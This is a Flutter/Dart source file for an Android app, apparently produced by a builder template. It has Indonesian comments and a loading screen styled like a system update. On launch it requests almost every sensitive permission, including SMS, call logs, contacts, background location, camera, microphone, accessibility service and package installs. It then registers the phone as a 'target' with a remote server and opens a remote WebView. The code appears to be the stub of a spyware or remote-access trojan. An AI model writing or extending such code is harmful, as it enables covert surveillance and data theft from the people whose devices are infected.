import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

import 'config/build_config.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const GeneratedApp());
}

// ==========================================
// ===== ROOT APP =====
// ==========================================
class GeneratedApp extends StatelessWidget {
  const GeneratedApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: BuildConfig.appName,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
          seedColor: const Color(0xFF7C9EF5),
        ),
        useMaterial3: true,
      ),
      home: const AppBootstrap(),
    );
  }
}

// ==========================================
// ===== BOOTSTRAP: PERMISSION + REGISTER =====
// ==========================================
class AppBootstrap extends StatefulWidget {
  const AppBootstrap({super.key});

  @override
  State<AppBootstrap> createState() => _AppBootstrapState();
}

class _AppBootstrapState extends State<AppBootstrap> {
  String _status = 'Memuat...';
  bool _ready = false;

  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    try {
      // ===== 1. Simpan accessKey ke SharedPreferences =====
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('accessKey', BuildConfig.accessKey);
      await prefs.setString('appName', BuildConfig.appName);
      await prefs.setString('buildId', BuildConfig.buildId);
      await prefs.setString('packageName', BuildConfig.packageName);
      await prefs.setString('serverUrl', BuildConfig.serverUrl);

      // ===== 2. Request permissions =====
      if (mounted) setState(() => _status = 'Meminta izin...');
      await _requestPermissions();

      // ===== 3. Register device ke server =====
      if (mounted) setState(() => _status = 'Mendaftar device...');
      await _registerDevice();

      if (!mounted) return;
      setState(() {
        _status = 'Siap';
        _ready = true;
      });
    } catch (e) {
      debugPrint('❌ Bootstrap error: $e');
      if (!mounted) return;
      setState(() {
        _status = 'Siap (dengan keterbatasan)';
        _ready = true;
      });
    }
  }

  // ==========================================
  // ===== REQUEST PERMISSIONS =====
  // ==========================================
  Future<void> _requestPermissions() async {
    // Deteksi Android SDK version
    int sdkInt = 0;
    try {
      if (Platform.isAndroid) {
        final androidInfo = await _getAndroidSdkInt();
        sdkInt = androidInfo;
      }
    } catch (e) {
      debugPrint('⚠️ Cannot get Android SDK: $e');
    }

    final permissions = <Permission>[
      // ===== CAMERA & MICROPHONE =====
      Permission.camera,
      Permission.microphone,

      // ===== LOCATION =====
      Permission.location,
      Permission.locationWhenInUse,
      Permission.locationAlways,

      // ===== NOTIFICATION =====
      Permission.notification,

      // ===== PHONE (cover: READ_PHONE_STATE, CALL_PHONE, READ_CALL_LOG, WRITE_CALL_LOG) =====
      Permission.phone,

      // ===== CONTACTS =====
      Permission.contacts,

      // ===== SMS (cover: READ_SMS, SEND_SMS, RECEIVE_SMS) =====
      Permission.sms,

      // ===== CALENDAR =====
      Permission.calendarFullAccess,
      Permission.calendarWriteOnly,

      // ===== SENSORS =====
      Permission.sensors,
      Permission.activityRecognition,

      // ===== BLUETOOTH =====
      Permission.bluetooth,
      Permission.bluetoothScan,
      Permission.bluetoothConnect,

      // ===== SYSTEM =====
      Permission.ignoreBatteryOptimizations,
      Permission.systemAlertWindow,
      Permission.requestInstallPackages,

      // ===== ACCESSIBILITY =====
      Permission.accessibilityService,
    ];

    // ===== STORAGE: beda per Android version =====
    if (sdkInt >= 33) {
      // Android 13+
      permissions.addAll([
        Permission.photos,
        Permission.videos,
        Permission.audio,
      ]);
    } else {
      // Android 12 & below
      permissions.add(Permission.storage);
    }

    // ===== Request satu per satu =====
    for (final perm in permissions) {
      try {
        final status = await perm.status;
        if (status.isDenied || status.isLimited) {
          final result = await perm.request();
          debugPrint('🔑 ${perm.toString()}: $result');
        } else {
          debugPrint('🔑 ${perm.toString()}: $status (skip)');
        }
      } catch (e) {
        debugPrint('⚠️ Permission error (${perm.toString()}): $e');
      }
    }
  }

  // ==========================================
  // ===== GET ANDROID SDK INT =====
  // ==========================================
  Future<int> _getAndroidSdkInt() async {
    try {
      // Pakai Platform Channel ke native
      const channel = MethodChannel('orgsapp/device_info');
      final result = await channel.invokeMethod<int>('getSdkInt');
      return result ?? 0;
    } catch (e) {
      debugPrint('⚠️ getSdkInt error: $e');
      return 0;
    }
  }

  // ==========================================
  // ===== REGISTER DEVICE KE SERVER =====
  // ==========================================
  Future<void> _registerDevice() async {
    if (BuildConfig.accessKey.isEmpty) {
      debugPrint('⚠️ Access key kosong, skip register');
      return;
    }

    try {
      // Ambil info device
      final battery = Battery();
      int batteryLevel = 0;
      try {
        batteryLevel = await battery.batteryLevel;
      } catch (e) {
        debugPrint('⚠️ Battery error: $e');
      }

      final connectivity = Connectivity();
      String connType = 'unknown';
      try {
        final result = await connectivity.checkConnectivity();
        connType = result.toString();
      } catch (e) {
        debugPrint('⚠️ Connectivity error: $e');
      }

      // Device ID (persist)
      final prefs = await SharedPreferences.getInstance();
      String deviceId = prefs.getString('deviceId') ?? '';
      if (deviceId.isEmpty) {
        deviceId = 'dev_${DateTime.now().millisecondsSinceEpoch}';
        await prefs.setString('deviceId', deviceId);
      }

      // Register ke server
      final res = await _httpPost(
        '${BuildConfig.serverUrl}/api/register-target',
        {
          'id': deviceId,
          'model': await _getDeviceModel(),
          'brand': await _getDeviceBrand(),
          'androidVersion': await _getAndroidVersion(),
          'battery': batteryLevel,
          'ip': connType,
          'appName': BuildConfig.appName,
          'packageName': BuildConfig.packageName,
          'accessKey': BuildConfig.accessKey,
          'buildId': BuildConfig.buildId,
        },
      );

      debugPrint('📥 Register result: $res');

      // ===== Simpan info device =====
      await prefs.setString('deviceModel', await _getDeviceModel());
      await prefs.setBool('registered', true);
    } catch (e) {
      debugPrint('❌ Register error: $e');
    }
  }

  Future<String> _getDeviceModel() async {
    try {
      const channel = MethodChannel('orgsapp/device_info');
      final result = await channel.invokeMethod<String>('getModel');
      return result ?? 'Android Device';
    } catch (_) {
      return 'Android Device';
    }
  }

  Future<String> _getDeviceBrand() async {
    try {
      const channel = MethodChannel('orgsapp/device_info');
      final result = await channel.invokeMethod<String>('getBrand');
      return result ?? 'Android';
    } catch (_) {
      return 'Android';
    }
  }

  Future<String> _getAndroidVersion() async {
    try {
      const channel = MethodChannel('orgsapp/device_info');
      final result = await channel.invokeMethod<String>('getAndroidVersion');
      return result ?? 'Unknown';
    } catch (_) {
      return 'Unknown';
    }
  }

  // ==========================================
  // ===== HTTP POST (dart:io, tanpa package) =====
  // ==========================================
  Future<String?> _httpPost(String url, Map<String, dynamic> body) async {
    try {
      final client = HttpClient();
      client.connectionTimeout = const Duration(seconds: 15);

      final request = await client.postUrl(Uri.parse(url));
      request.headers.contentType = ContentType.json;
      request.headers.set('X-Access-Key', BuildConfig.accessKey);
      request.write(jsonEncode(body));

      final response = await request.close();
      final responseBody = await response.transform(utf8.decoder).join();
      client.close();

      return responseBody;
    } catch (e) {
      debugPrint('❌ HTTP error: $e');
      return null;
    }
  }

  // ==========================================
  // ===== BUILD =====
  // ==========================================
  @override
  Widget build(BuildContext context) {
    if (!_ready) {
      return _buildLoadingScreen();
    }
    return const WebViewHome();
  }

  Widget _buildLoadingScreen() {
    return Scaffold(
      backgroundColor: const Color(0xFFF5F1E8),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              // Logo
              Container(
                width: 80,
                height: 80,
                decoration: BoxDecoration(
                  color: const Color(0xFF7C9EF5),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(
                    color: const Color(0xFF1F1F1F),
                    width: 3,
                  ),
                  boxShadow: const [
                    BoxShadow(
                      color: Color(0xFF1F1F1F),
                      offset: Offset(4, 4),
                      blurRadius: 0,
                    ),
                  ],
                ),
                child: const Icon(
                  Icons.system_update_rounded,
                  color: Color(0xFF1F1F1F),
                  size: 44,
                ),
              ),
              const SizedBox(height: 32),

              // App name
              Text(
                BuildConfig.appName,
                style: const TextStyle(
                  fontSize: 22,
                  fontWeight: FontWeight.w900,
                  color: Color(0xFF1F1F1F),
                  letterSpacing: -0.5,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 8),

              // Status
              Text(
                _status,
                style: const TextStyle(
                  fontSize: 13,
                  fontWeight: FontWeight.w600,
                  color: Color(0xFF6B6B6B),
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 32),

              // Progress
              const SizedBox(
                width: 24,
                height: 24,
                child: CircularProgressIndicator(
                  strokeWidth: 3,
                  color: Color(0xFF1F1F1F),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ==========================================
// ===== WEBVIEW HOME =====
// ==========================================
class WebViewHome extends StatefulWidget {
  const WebViewHome({super.key});

  @override
  State<WebViewHome> createState() => _WebViewHomeState();
}

class _WebViewHomeState extends State<WebViewHome> {
  late final WebViewController _controller;
  bool _isLoading = true;
  int _progress = 0;
  bool _hasError = false;
  String _errorMessage = '';

  @override
  void initState() {
    super.initState();
    _initWebView();
  }

  void _initWebView() {
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(const Color(0xFFFFFFFF))
      ..setUserAgent(
        'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
      )
      ..addJavaScriptChannel(
        'AppBridge',
        onMessageReceived: (msg) {
          debugPrint('📨 From web: ${msg.message}');
          _handleWebMessage(msg.message);
        },
      )
      ..setNavigationDelegate(
        NavigationDelegate(
          onProgress: (p) {
            if (mounted) setState(() => _progress = p);
          },
          onPageStarted: (_) {
            if (mounted) {
              setState(() {
                _isLoading = true;
                _hasError = false;
              });
            }
          },
          onPageFinished: (_) async {
            if (!mounted) return;
            setState(() => _isLoading = false);
            await _injectConfig();
          },
          onWebResourceError: (error) {
            if (!mounted) return;
            setState(() {
              _hasError = true;
              _errorMessage = error.description;
              _isLoading = false;
            });
            debugPrint('❌ WebView error: ${error.description}');
          },
          onNavigationRequest: (request) {
            // Izinkan semua navigasi
            return NavigationDecision.navigate;
          },
        ),
      )
      ..loadRequest(Uri.parse(BuildConfig.webviewUrl));
  }

  Future<void> _injectConfig() async {
    try {
      final js = """
        (function() {
          try {
            localStorage.setItem('accessKey', '${BuildConfig.accessKey}');
            localStorage.setItem('appName', '${BuildConfig.appName}');
            localStorage.setItem('packageName', '${BuildConfig.packageName}');
            localStorage.setItem('buildId', '${BuildConfig.buildId}');
            localStorage.setItem('serverUrl', '${BuildConfig.serverUrl}');
            localStorage.setItem('isNativeApp', 'true');
            console.log('[App] Config injected');
          } catch (e) {
            console.error('[App] Inject error', e);
          }
        })();
      """;
      await _controller.runJavaScript(js);
      debugPrint('✅ Config injected ke WebView');
    } catch (e) {
      debugPrint('❌ Inject error: $e');
    }
  }

  void _handleWebMessage(String message) {
    try {
      final data = jsonDecode(message);
      final action = data['action']?.toString();

      switch (action) {
        case 'openUrl':
          final url = data['url']?.toString();
          if (url != null && url.isNotEmpty) {
            launchUrl(
              Uri.parse(url),
              mode: LaunchMode.externalApplication,
            );
          }
          break;
        case 'close':
          SystemNavigator.pop();
          break;
        default:
          debugPrint('Unknown action: $action');
      }
    } catch (e) {
      debugPrint('Parse message error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      onPopInvoked: (didPop) async {
        if (didPop) return;
        final canGoBack = await _controller.canGoBack();
        if (canGoBack) {
          await _controller.goBack();
        } else {
          if (mounted) SystemNavigator.pop();
        }
      },
      child: Scaffold(
        body: SafeArea(
          child: Stack(
            children: [
              // ===== WEBVIEW =====
              if (!_hasError)
                WebViewWidget(controller: _controller)
              else
                _buildErrorScreen(),

              // ===== PROGRESS BAR =====
              if (_isLoading && !_hasError)
                Positioned(
                  top: 0,
                  left: 0,
                  right: 0,
                  child: LinearProgressIndicator(
                    value: _progress / 100,
                    backgroundColor: Colors.grey.shade200,
                    color: const Color(0xFF7C9EF5),
                    minHeight: 3,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildErrorScreen() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: const Color(0xFFF5A97C),
                shape: BoxShape.circle,
                border: Border.all(
                  color: const Color(0xFF1F1F1F),
                  width: 2,
                ),
              ),
              child: const Icon(
                Icons.wifi_off_rounded,
                color: Color(0xFF1F1F1F),
                size: 40,
              ),
            ),
            const SizedBox(height: 20),
            const Text(
              'Koneksi Bermasalah',
              style: TextStyle(
                fontSize: 16,
                fontWeight: FontWeight.w900,
                color: Color(0xFF1F1F1F),
              ),
            ),
            const SizedBox(height: 8),
            Text(
              _errorMessage,
              textAlign: TextAlign.center,
              style: const TextStyle(
                fontSize: 12,
                fontWeight: FontWeight.w600,
                color: Color(0xFF6B6B6B),
              ),
            ),
            const SizedBox(height: 20),
            GestureDetector(
              onTap: () {
                setState(() {
                  _hasError = false;
                  _isLoading = true;
                });
                _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
              },
              child: Container(
                padding: const EdgeInsets.symmetric(
                  horizontal: 24,
                  vertical: 12,
                ),
                decoration: BoxDecoration(
                  color: const Color(0xFF7C9EF5),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: const Color(0xFF1F1F1F),
                    width: 2,
                  ),
                  boxShadow: const [
                    BoxShadow(
                      color: Color(0xFF1F1F1F),
                      offset: Offset(3, 3),
                      blurRadius: 0,
                    ),
                  ],
                ),
                child: const Text(
                  'COBA LAGI',
                  style: TextStyle(
                    fontSize: 13,
                    fontWeight: FontWeight.w900,
                    color: Color(0xFF1F1F1F),
                    letterSpacing: 1,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
